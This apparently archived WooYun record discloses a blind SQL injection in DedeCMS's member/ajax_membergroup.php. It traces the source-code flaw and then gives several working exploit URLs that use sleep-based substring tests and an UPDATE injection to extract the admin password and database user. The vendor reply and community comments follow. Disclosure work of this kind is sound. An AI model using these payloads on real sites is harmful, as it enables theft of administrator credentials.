{"id": 6007, "wybug_id": "wooyun-2013-043674", "wybug_title": "dedecms SQL盲注漏洞（已经确定可以直接update出密码）", "wybug_corp": "Dedecms", "wybug_author": "胸大无脑", "wybug_date": "2013-11-22 12:11", "wybug_open_date": "2014-02-17 12:11", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-27：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-17：\t细节向公众公开  简要描述： 某处盲注，获取任意数据 详细说明：  漏洞处在ROOT_PATH/member/ajax_membergroup.php的53、54行\n\n$mdescription变量是可控的，并且没有任何过滤，为什么？接下里继续看再看第一行\n\n包含了ROOT_PATH/member/config.php然后跟着ROOT_PATH/member/config.php\n\n第10行，包含了ROOT_PATH/include/filter.inc.php接着来到filter.inc.php\n\n首先这里有个典型的变量覆盖，并且会遍历里面对其进行过滤来看看过滤函数\n\n$cfg_notallowstr是什么来看看\n\n为空那么这是干什么的，这个函数是用来过滤敏感词的，比如各种和谐。意思就是在filter.inc.php里面发生了变量覆盖并且没有任何过滤。然后ROOT_PATH/member/config.php包含了filter.inc.php。ROOT_PATH/member/ajax_membergroup.php又去包含了ROOT_PATH/member/config.php通过覆盖$mdescription我们可以任意控制sql语句   漏洞证明：  首先要能注册EXP\nhttp://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&mid=1&action=despost&mdescription=asd'  where id=@`'` or(select if(substring((select pwd from dede_admin),1,1)='f',sleep(5),0)) -- - @`'`\n\nhttp://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&mid=1&action=despost&mdescription=asd'  where id=@`'` or(select if(substring((select 1),1,1)='1',sleep(5),0)) -- - @`'`\n\nhttp://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&mid=1&action=despost&mdescription=asd'  where id=@`'` or(select if(substring((select user()),1,1)='r',sleep(5),0)) -- - @`'`\n\n\n\n\n\n\n\nhttp://127.0.0.1/dede/member/ajax_membergroup.php?action=desshow&mid=1&action=despost&mdescription=asd'  where id=@`'` or(select if(substring((select pwd from dede_admin),1,1)='f',sleep(5),0)) -- - @`'`\n\n\n\nview-source:http://localhost/test/dedecms/member/ajax_membergroup.php?action=desshow&mid=1&action=despost&mdescription=',funame=char(@`'`),description=(select%20user()),funame='\n\n最终成  UPDATE `dede_member_friends` SET `description`='',funame=char(@`'`),description=(select user()),funame='' WHERE `fid`='1' AND `mid`='1'   绕过checksql执行了\n   修复方案：  filter.inc.php里面做过滤   版权声明：转载请注明来源 胸大无脑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-17 12:11 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-22 12:12 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  好屌的样子！！    \n     2013-11-22 12:30 |    \t\tHoerWing \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:4        | \"People should not be afraid of their go...)\t\t \n  神奇的路人甲    \n     2013-11-22 12:48 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  为神马要盲注呢？    \n     2013-11-22 12:55 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  不明觉厉    \n     2013-11-22 12:59 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  这种无良厂商乌云还留着呢啊    \n     2013-11-22 13:05 |    \t\t月清晖 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:1        | some of what?)\t\t \n  又是一批站倒下。    \n     2013-11-22 13:14 |    \t\t胸大无脑 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:2        | 宿舍求别断电)\t\t \n  @xsser 求教育求扫盲求鞭打是说直接update进去一个 select user()这种吗，然后后面一句就可以select出来展现在页面上了。。。。。但是decription有单引号包裹着的啊。。。。总之求扫盲    \n     2013-11-22 13:23 |    \t\tsysALong \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 电脑里的AV片 永远 和 电脑旁的卫生纸 成 ...)\t\t \n  不明觉厉    \n     2013-11-22 13:23 |    \t\tJinGuiZi \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:6        | 。。)\t\t \n  胸大无脑都能盲注？    \n     2013-11-22 13:31 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  mark！！！！！！！！！！    \n     2013-11-22 15:47 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  求公开啊      \n     2013-11-22 16:37 |    \t\t马丁 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:23        | 大爷~给口饭吧。)\t\t \n  神奇路人甲一直都真审核秒过的姿势    \n     2013-11-22 16:46 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  好屌的样子！！    \n     2013-11-22 18:33 |    \t\t再见江南 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 维护世界和平)\t\t \n  盲注改了后台没用    \n     2013-11-22 18:57 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  这个必须要关注！    \n     2013-11-23 10:45 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  关注一下    \n     2013-11-23 16:33 |    \t\tcharles \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 研究web安全,0day,漏洞挖掘,关注国内安全动...)\t\t \n  关注下v    \n     2013-11-27 18:06 |    \t\t小权 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 小菜鸟，求各位大姐大哥多多指教)\t\t \n  关注一下    \n     2013-11-28 22:44 |    \t\t马丁 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:23        | 大爷~给口饭吧。)\t\t \n  又是忽略 - -    \n     2013-11-28 22:45 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @马丁 dedecms就没确认过    \n     2013-11-28 22:50 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @xsser @疯狗 @finger 我想说dedecms这种厂商还留在乌云干啥     \n     2013-12-13 14:48 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  MARK    \n     2013-12-13 14:53 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @xsser 这种情况乌云不给分吗，至少来个乌云评价吧,洞主挖洞好可怜    \n     2013-12-13 14:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @小川 奖励已发哦    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}